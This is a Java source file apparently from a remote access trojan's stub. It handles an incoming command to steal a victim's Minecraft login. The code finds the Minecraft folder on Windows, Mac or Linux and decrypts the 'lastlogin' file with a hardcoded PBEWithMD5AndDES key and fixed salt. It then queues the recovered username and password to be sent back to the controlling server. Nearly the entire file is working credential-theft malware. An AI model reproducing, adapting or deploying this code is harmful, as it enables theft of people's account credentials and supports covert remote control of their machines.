package com.redpois0n.packets.incoming;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.Random;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.PBEParameterSpec;

import com.redpois0n.Connection;
import com.redpois0n.stub.packets.outgoing.Packet36MinecraftPassword;


public class PacketMC extends AbstractIncomingPacket {

	@SuppressWarnings("unused")
	@Override
	public void read() throws Exception {
		String os = System.getProperty("os.name", "").toLowerCase();
		String home = System.getProperty("user.home", ".");
		File file = null;
		if (os.contains("win")) {
			String appdata = System.getenv("APPDATA");
			if (appdata != null) {
				file = new File(appdata, ".minecraft");
			} else {
				file = new File(home, ".minecraft");
			}
		} else if (os.contains("mac")) {
			file = new File(home, "Library/Application Support/minecraft");
		} else {
			file = new File(home, ".minecraft/");
		}

		try {
			Random random = new Random(43287234L);
			byte[] salt = new byte[8];
			random.nextBytes(salt);
			PBEParameterSpec pbeParamSpec = new PBEParameterSpec(salt, 5);
			SecretKey pbeKey = SecretKeyFactory.getInstance("PBEWithMD5AndDES").generateSecret(new PBEKeySpec("passwordfile".toCharArray()));
			Cipher cipher = Cipher.getInstance("PBEWithMD5AndDES");
			cipher.init(2, pbeKey, pbeParamSpec);
			File passFile = new File(file, "lastlogin");
			DataInputStream dis = null;
			if (cipher != null) {
				dis = new DataInputStream(new CipherInputStream(new FileInputStream(passFile), cipher));
			} else {
				dis = new DataInputStream(new FileInputStream(passFile));
			}
			
			Connection.addToSendQueue(new Packet36MinecraftPassword(dis.readUTF(), dis.readUTF()));
			dis.close();
		} catch (Exception ex) {
			ex.printStackTrace();
			Connection.addToSendQueue(new Packet36MinecraftPassword("ERR", ex.getClass().getSimpleName() + ": " + ex.getMessage() ));
		}
	}

}
